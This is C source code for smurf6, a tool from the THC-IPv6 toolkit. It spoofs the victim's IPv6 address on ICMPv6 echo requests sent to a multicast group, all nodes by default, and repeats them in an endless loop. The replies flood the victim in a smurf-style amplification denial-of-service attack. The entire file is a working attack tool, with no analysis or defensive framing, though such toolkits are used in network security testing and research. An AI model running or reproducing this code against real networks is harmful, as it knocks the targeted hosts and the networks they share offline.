#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

extern int debug;

void help(char *prg) {
  printf("%s %s (c) 2006 by %s %s\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-r] interface victim-ip [multicast-network-address]\n", prg);
  printf("Smurf the target with icmp echo replies. Target of echo request is the\n");
  printf("local all-nodes multicast address if not specified\n");
  printf("Use -r to use raw mode.\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  unsigned char *pkt = NULL, buf[16], fakemac[7] = "\x00\x00\xde\xad\xbe\xef";
  unsigned char *multicast6, *victim6;
  int pkt_len = 0;
  char *interface;
  int rawmode = 0;

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  interface = argv[1];
  victim6 = thc_resolve6(argv[2]);
  if (argv[3] != NULL)
    multicast6 = thc_resolve6(argv[3]);
  else
    multicast6 = thc_resolve6("ff02::1");

  memset(buf, 'A', 16);
  if ((pkt = thc_create_ipv6(interface, PREFER_GLOBAL, &pkt_len, victim6, multicast6, 0, 0, 0, 0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xdeadbeef, (unsigned char *) &buf, 16, 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, fakemac, NULL, pkt, &pkt_len) < 0) {
    fprintf(stderr, "Error: Can not generate packet, exiting ...\n");
    exit(-1);
  }
  
  printf("Starting smurf6 attack against %s (Press Control-C to end) ...\n", argv[2]);
  while(1)
    thc_send_pkt(interface, pkt, &pkt_len);

  return 0;
}
